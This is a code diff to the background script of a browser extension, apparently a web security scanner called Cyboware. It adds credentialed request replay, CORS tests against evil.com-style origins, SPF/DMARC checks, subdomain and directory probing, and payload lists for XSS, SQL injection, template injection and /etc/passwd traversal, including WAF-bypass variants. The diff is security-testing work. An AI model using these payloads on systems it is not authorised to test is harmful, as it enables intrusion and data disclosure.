@@ -16,7 +16,7 @@ chrome.contextMenus.onClicked.addListener((info, tab) => {
   if (info.menuItemId === 'cyboware-scan') chrome.sidePanel.open({ tabId: tab.id });
 });
 
-// Capture main-frame response headers
+// Capture main-frame response headers (lightweight — no extraHeaders)
 chrome.webRequest.onHeadersReceived.addListener(
   (d) => {
     if (d.tabId < 0) return;
@@ -30,18 +30,29 @@ chrome.webRequest.onHeadersReceived.addListener(
       else {
         capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', statusCode: d.statusCode, responseHeaders: d.responseHeaders || [], timestamp: Date.now() });
       }
-      if (capturedRequests[d.tabId].length > 50) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-50);
+      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
     }
   },
-  { urls: ['<all_urls>'] }, ['responseHeaders', 'extraHeaders']
+  { urls: ['<all_urls>'] }, ['responseHeaders']
 );
 
+// Track XHR/fetch request URLs, methods, and POST bodies
 chrome.webRequest.onBeforeRequest.addListener(
   (d) => {
     if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch')) return;
     if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
-    capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', body: d.requestBody, timestamp: Date.now() });
-    if (capturedRequests[d.tabId].length > 50) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-50);
+    if (!capturedRequests[d.tabId].some(r => r.requestId === d.requestId)) {
+      const entry = { requestId: d.requestId, url: d.url, method: d.method || 'GET', timestamp: Date.now() };
+      // Capture POST/PUT body for request replayer
+      if (d.requestBody) {
+        if (d.requestBody.formData) entry.body = Object.entries(d.requestBody.formData).map(([k,v]) => `${k}=${v}`).join('&');
+        else if (d.requestBody.raw?.length) {
+          try { entry.body = new TextDecoder().decode(new Uint8Array(d.requestBody.raw[0].bytes)); } catch {}
+        }
+      }
+      capturedRequests[d.tabId].push(entry);
+      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
+    }
   },
   { urls: ['<all_urls>'] }, ['requestBody']
 );
@@ -57,7 +68,7 @@ chrome.webRequest.onSendHeaders.addListener(
     const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
     if (ex) ex.requestHeaders = d.requestHeaders;
   },
-  { urls: ['<all_urls>'] }, ['requestHeaders', 'extraHeaders']
+  { urls: ['<all_urls>'] }, ['requestHeaders']
 );
 
 chrome.tabs.onRemoved.addListener((id) => { delete tabHeaders[id]; delete capturedRequests[id]; });
@@ -74,7 +85,7 @@ const handlers = {
 
   FETCH_URL: async (msg, _, sr) => {
     try {
-      const opts = { method: msg.method || 'GET', headers: msg.headers || {} };
+      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: 'include' };
       if (msg.body) opts.body = msg.body;
       const res = await fetch(msg.url, opts);
       const text = await res.text();
@@ -125,22 +136,39 @@ const handlers = {
 
   TEST_CORS: async (msg, _, sr) => {
     const results = [];
-    for (const origin of [msg.attackerOrigin || 'https://evil.com', 'null', msg.targetOrigin]) {
+    const targetUrl = new URL(msg.url);
+    const targetDomain = targetUrl.hostname;
+    const targetOrigin = targetUrl.origin;
+    // Build comprehensive origin list
+    const origins = [
+      { origin: 'https://evil.com', label: 'External domain' },
+      { origin: 'null', label: 'Null origin' },
+      { origin: targetOrigin, label: 'Same origin (baseline)' },
+      { origin: `https://sub.${targetDomain}`, label: 'Subdomain reflection' },
+      { origin: `https://${targetDomain}.evil.com`, label: 'Domain suffix bypass' },
+      { origin: `https://evil${targetDomain}`, label: 'Domain prefix bypass' },
+      { origin: `https://evil.com.${targetDomain}`, label: 'Subdomain injection' },
+      { origin: 'https://localhost', label: 'Localhost' },
+      { origin: `http://${targetDomain}`, label: 'HTTP downgrade' },
+    ];
+    for (const { origin, label } of origins) {
       try {
-        const r = await fetch(msg.url, { method: 'OPTIONS', headers: { 'Origin': origin, 'Access-Control-Request-Method': 'GET' } });
-        results.push({ origin, acao: r.headers.get('access-control-allow-origin'), acac: r.headers.get('access-control-allow-credentials'), status: r.status });
-      } catch (e) { results.push({ origin, error: e.message }); }
+        const r = await fetch(msg.url, { headers: { 'Origin': origin }, signal: AbortSignal.timeout(5000) });
+        const acao = r.headers.get('access-control-allow-origin');
+        const acac = r.headers.get('access-control-allow-credentials');
+        const reflected = acao === origin;
+        const wildcard = acao === '*';
+        const vuln = (reflected || wildcard) && (label !== 'Same origin (baseline)');
+        const critical = vuln && acac === 'true';
+        results.push({ origin, label, acao, acac, status: r.status, reflected, wildcard, vuln, critical });
+      } catch (e) { results.push({ origin, label, error: e.message }); }
     }
-    try {
-      const r = await fetch(msg.url, { headers: { 'Origin': 'https://evil.com' } });
-      results.push({ type: 'GET', origin: 'https://evil.com', acao: r.headers.get('access-control-allow-origin'), acac: r.headers.get('access-control-allow-credentials'), status: r.status });
-    } catch (e) { results.push({ type: 'GET', error: e.message }); }
     sr({ ok: true, results });
   },
 
   REPLAY_REQUEST: async (msg, _, sr) => {
     try {
-      const opts = { method: msg.method || 'GET', headers: msg.headers || {} };
+      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: 'include' };
       if (msg.body) opts.body = msg.body;
       const r = await fetch(msg.url, opts);
       const text = await r.text();
@@ -199,7 +227,39 @@ const handlers = {
           if (d.Answer) results[type] = d.Answer.map(a => a.data);
         } catch {}
       }
-      sr({ ok: true, records: results });
+      // SPF/DMARC analysis
+      const emailSecurity = { spf: null, dmarc: null, findings: [] };
+      // SPF from TXT records
+      const txts = results.TXT || [];
+      const spfRecord = txts.find(t => t.toLowerCase().includes('v=spf1'));
+      if (spfRecord) {
+        emailSecurity.spf = spfRecord;
+        if (spfRecord.includes('+all')) emailSecurity.findings.push({ severity: 'high', text: 'SPF +all — allows ANY server to send email (spoofable)' });
+        else if (spfRecord.includes('~all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ~all (softfail) — emails may still be delivered (spoofable with effort)' });
+        else if (spfRecord.includes('?all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ?all (neutral) — no enforcement' });
+        else if (spfRecord.includes('-all')) emailSecurity.findings.push({ severity: 'low', text: 'SPF -all (hardfail) — properly configured' });
+      } else {
+        emailSecurity.findings.push({ severity: 'high', text: 'No SPF record — email spoofing possible' });
+      }
+      // DMARC lookup
+      try {
+        const dr = await fetch(`https://dns.google/resolve?name=_dmarc.${encodeURIComponent(msg.domain)}&type=TXT`);
+        const dd = await dr.json();
+        if (dd.Answer) {
+          const dmarcRec = dd.Answer.find(a => a.data.includes('v=DMARC1'));
+          if (dmarcRec) {
+            emailSecurity.dmarc = dmarcRec.data;
+            if (dmarcRec.data.includes('p=none')) emailSecurity.findings.push({ severity: 'medium', text: 'DMARC p=none — monitoring only, no enforcement' });
+            else if (dmarcRec.data.includes('p=quarantine')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=quarantine — suspicious mail quarantined' });
+            else if (dmarcRec.data.includes('p=reject')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=reject — properly configured' });
+          } else {
+            emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
+          }
+        } else {
+          emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
+        }
+      } catch {}
+      sr({ ok: true, records: results, emailSecurity });
     } catch (e) { sr({ ok: false, error: e.message }); }
   },
 
@@ -252,26 +312,55 @@ const handlers = {
       xss: [
         { p: '<script>alert(1)</script>', check: 'unencoded_html' },
         { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
-        { p: "'-alert(1)-'", check: 'reflected' },
         { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
         { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
+        // WAF bypass: event handler with tab char
+        { p: '<svg\tonload=alert(1)>', check: 'unencoded_html' },
+        // WAF bypass: details/ontoggle (bypasses Akamai)
+        { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
+        // WAF bypass: HTML entity obfuscation
+        { p: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', check: 'unencoded_html' },
+        // WAF bypass: double encoding
+        { p: '%253Csvg%2520onload%253Dalert(1)%253E', check: 'reflected' },
+        // WAF bypass: JavaScript URI
+        { p: 'javascript:alert(1)//', check: 'reflected' },
+        // WAF bypass: unicode normalization
+        { p: '<svg onload=\u0061lert(1)>', check: 'unencoded_html' },
       ],
       sqli: [
         { p: "' OR '1'='1", check: 'sqli_error' },
         { p: "1' AND '1'='1", check: 'sqli_error' },
         { p: "' UNION SELECT NULL--", check: 'sqli_error' },
         { p: "1; DROP TABLE--", check: 'sqli_error' },
+        // WAF bypass: comment injection
+        { p: "1'/*!50000OR*/'1'='1", check: 'sqli_error' },
+        // WAF bypass: case variation
+        { p: "' uNiOn SeLeCt NULL--", check: 'sqli_error' },
+        // WAF bypass: double encoding
+        { p: "%27%20OR%201%3D1--", check: 'sqli_error' },
+        // Error-based
+        { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
       ],
       ssti: [
         { p: '{{91371*3}}', check: 'ssti_eval', expect: '274113' },
         { p: '${78234+1}', check: 'ssti_eval', expect: '78235' },
         { p: '<%= 71*6823 %>', check: 'ssti_eval', expect: '484433' },
         { p: '#{93847+1}', check: 'ssti_eval', expect: '93848' },
+        // Jinja2 specific
+        { p: '{{config.__class__.__init__.__globals__}}', check: 'reflected' },
+        // Twig
+        { p: '{{_self.env.display("id")}}', check: 'reflected' },
       ],
       path: [
         { p: '../../../etc/passwd', check: 'file_content' },
         { p: '....//....//etc/passwd', check: 'file_content' },
         { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
+        // WAF bypass: null byte
+        { p: '../../../etc/passwd%00', check: 'file_content' },
+        // WAF bypass: URL encoding
+        { p: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', check: 'file_content' },
+        // WAF bypass: double URL encoding
+        { p: '%252e%252e/%252e%252e/etc/passwd', check: 'file_content' },
       ],
     };
 
@@ -284,12 +373,16 @@ const handlers = {
       if (!params.length) { sr({ ok: true, results: [], params: [], message: 'No URL parameters found. Add ?param=value to test.' }); return; }
 
       const category = msg.category || 'xss';
-      const testPayloads = payloads[category] || payloads.xss;
+      const testPayloads = [...(payloads[category] || payloads.xss)];
+      // Add custom payloads from user
+      if (msg.customPayloads && msg.customPayloads.length) {
+        msg.customPayloads.forEach(cp => testPayloads.push({ p: cp, check: 'reflected' }));
+      }
 
       // Baseline request for comparison
       let baselineLen = 0;
       try {
-        const br = await fetch(msg.url, { signal: AbortSignal.timeout(5000) });
+        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(5000) });
         const bt = await br.text();
         baselineLen = bt.length;
       } catch {}
@@ -299,7 +392,7 @@ const handlers = {
           const testUrl = new URL(msg.url);
           testUrl.searchParams.set(param, payload);
           try {
-            const r = await fetch(testUrl.toString(), { redirect: 'follow', signal: AbortSignal.timeout(5000) });
+            const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(5000) });
             const body = await r.text();
             const rawReflected = body.includes(payload);
 
@@ -411,7 +504,12 @@ const handlers = {
               analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
             }
 
-            results.push({ param, payload, severity, analysis, status: r.status, bodyLen: body.length, context: severity !== 'safe' ? context : '', url: testUrl.toString() });
+            // Capture error response bodies (500s often leak stack traces)
+            let errorBody = '';
+            if (r.status >= 500 && body.length < 5000) {
+              errorBody = body.slice(0, 500);
+            }
+            results.push({ param, payload, severity, analysis, status: r.status, bodyLen: body.length, context: severity !== 'safe' ? context : '', url: testUrl.toString(), errorBody });
           } catch (e) {
             results.push({ param, payload, severity: 'info', analysis: 'Request failed: ' + e.message, error: e.message });
           }
@@ -546,11 +644,11 @@ const handlers = {
     try {
       // Baseline
       let baseStatus;
-      try { const br = await fetch(url, { signal: AbortSignal.timeout(5000) }); baseStatus = br.status; } catch { baseStatus = 0; }
+      try { const br = await fetch(url, { credentials: 'include', signal: AbortSignal.timeout(5000) }); baseStatus = br.status; } catch { baseStatus = 0; }
       const results = [{ technique: 'Baseline', status: baseStatus, type: 'baseline' }];
       for (const t of techniques) {
         try {
-          const opts = { method: t.method || 'GET', headers: t.headers || {}, redirect: 'manual', signal: AbortSignal.timeout(5000) };
+          const opts = { method: t.method || 'GET', headers: t.headers || {}, redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(5000) };
           const testUrl = t.url || url;
           const r = await fetch(testUrl, opts);
           const bypass = r.status >= 200 && r.status < 400 && baseStatus >= 400;
@@ -570,7 +668,7 @@ const handlers = {
       // Baseline GET
       let baseBody = '', baseStatus = 0, baseHeaders = {};
       try {
-        const br = await fetch(msg.url, { signal: AbortSignal.timeout(5000) });
+        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(5000) });
         baseBody = await br.text(); baseStatus = br.status;
         br.headers.forEach((v, k) => { baseHeaders[k] = v; });
       } catch {}
@@ -578,7 +676,7 @@ const handlers = {
       const results = [{ method: 'GET', status: baseStatus, bodyLen: baseBody.length, headers: baseHeaders, baseline: true }];
       for (const method of methods.slice(1)) {
         try {
-          const r = await fetch(msg.url, { method, redirect: 'follow', signal: AbortSignal.timeout(5000) });
+          const r = await fetch(msg.url, { method, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(5000) });
           const body = method === 'HEAD' ? '' : await r.text();
           const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
           const allow = rh['allow'] || '';
@@ -595,6 +693,93 @@ const handlers = {
       }
       sr({ ok: true, results });
     } catch (e) { sr({ ok: false, error: e.message }); }
+  },
+
+  // Probe endpoints for HTTP status
+  PROBE_ENDPOINTS: async (msg, _, sr) => {
+    const results = [];
+    const origin = new URL(msg.baseUrl).origin;
+    const eps = msg.endpoints.slice(0, 40);
+    for (let i = 0; i < eps.length; i += 8) {
+      const batch = eps.slice(i, i + 8);
+      const promises = batch.map(async (ep) => {
+        const url = ep.startsWith('http') ? ep : origin + (ep.startsWith('/') ? ep : '/' + ep);
+        try {
+          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(5000) });
+          return { endpoint: ep, url, status: r.status };
+        } catch {
+          try {
+            const r = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(5000) });
+            const len = (await r.text()).length;
+            return { endpoint: ep, url, status: r.status, size: len };
+          } catch { return { endpoint: ep, url, status: 'err' }; }
+        }
+      });
+      (await Promise.all(promises)).forEach(r => results.push(r));
+    }
+    sr({ ok: true, results });
+  },
+
+  // Probe links for status — use HEAD for speed, GET as fallback
+  PROBE_LINKS: async (msg, _, sr) => {
+    const results = [];
+    const links = msg.links.slice(0, 30).filter(u => {
+      try { new URL(u); return true; } catch { return false; }
+    });
+    for (let i = 0; i < links.length; i += 8) {
+      const batch = links.slice(i, i + 8);
+      const promises = batch.map(async (url) => {
+        try {
+          // Try HEAD first (fast)
+          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(5000) });
+          return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
+        } catch {
+          // Fallback to GET if HEAD fails
+          try {
+            const r = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(5000) });
+            return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
+          } catch (e) {
+            return { url, status: 'dead', error: e.message?.includes('timeout') ? 'Timeout' : 'Connection failed' };
+          }
+        }
+      });
+      (await Promise.all(promises)).forEach(r => results.push(r));
+    }
+    sr({ ok: true, results });
+  },
+
+  // Probe subdomains for HTTP status + title
+  PROBE_SUBDOMAINS: async (msg, _, sr) => {
+    const results = [];
+    const subs = msg.subdomains.slice(0, 50);
+    // Parallel batches of 10
+    for (let i = 0; i < subs.length; i += 10) {
+      const batch = subs.slice(i, i + 10);
+      const promises = batch.map(async (sub) => {
+        try {
+          const r = await fetch(`https://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
+          let title = '';
+          if (r.status === 200) {
+            try {
+              const html = await r.text();
+              const m = html.match(/<title[^>]*>([^<]{0,100})/i);
+              if (m) title = m[1].trim();
+            } catch {}
+          }
+          return { sub, status: r.status, title, url: r.url };
+        } catch (e) {
+          // Try HTTP if HTTPS fails
+          try {
+            const r2 = await fetch(`http://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
+            return { sub, status: r2.status, title: '', url: r2.url, http: true };
+          } catch {
+            return { sub, status: 'dead', error: e.message?.includes('fetch') ? 'No response' : e.message };
+          }
+        }
+      });
+      (await Promise.all(promises)).forEach(r => results.push(r));
+    }
+    sr({ ok: true, results });
   },
 
   // Directory Bruteforcer — parallel batches, category-based
@@ -618,11 +803,29 @@ const handlers = {
       // Scan from root, parent directory, AND current path as directory
       const parentDir = u.pathname.replace(/\/[^/]*$/, '/'); // /admin/panel → /admin/
       const currentAsDir = u.pathname.endsWith('/') ? u.pathname : u.pathname + '/'; // /admin/panel → /admin/panel/
-      const bases = new Set(['']); // root always
-      if (parentDir !== '/') bases.add(parentDir);
-      if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
+      const bases = new Set();
+      if (msg.scope === 'current') {
+        // Only scan from current path
+        if (parentDir !== '/') bases.add(parentDir);
+        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
+        if (!bases.size) bases.add(''); // fallback to root
+      } else if (msg.scope === 'root') {
+        bases.add(''); // root only
+      } else {
+        // both
+        bases.add('');
+        if (parentDir !== '/') bases.add(parentDir);
+        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
+      }
 
       const results = [];
+      // Baseline: fetch a known-nonexistent path to detect SPA catch-all pages
+      let baselineLen = 0;
+      try {
+        const br = await fetch(origin + '/cyboware-404-test-' + Date.now(), { redirect: 'manual', signal: AbortSignal.timeout(2000) });
+        if (br.status === 200) { baselineLen = (await br.text()).length; }
+      } catch {}
+
       const allPaths = [];
       bases.forEach(base => { paths.forEach(p => {
         // Avoid double slashes: /minar/ + /.env → /minar/.env
@@ -639,8 +842,17 @@ const handlers = {
             const interesting = r.status === 200 || r.status === 301 || r.status === 302 || r.status === 401 || r.status === 403;
             if (interesting) {
               let preview = '';
-              if (r.status === 200) { try { preview = (await r.text()).slice(0, 200); } catch {} }
-              return { path, status: r.status, preview };
+              let bodyLen = 0;
+              if (r.status === 200) {
+                try {
+                  const body = await r.text();
+                  preview = body.slice(0, 200);
+                  bodyLen = body.length;
+                } catch {}
+                // Skip SPA catch-all: if body length matches the 404 baseline, it's not a real page
+                if (baselineLen > 0 && Math.abs(bodyLen - baselineLen) < 200) return null;
+              }
+              return { path, status: r.status, preview, bodyLen };
             }
           } catch {}
           return null;
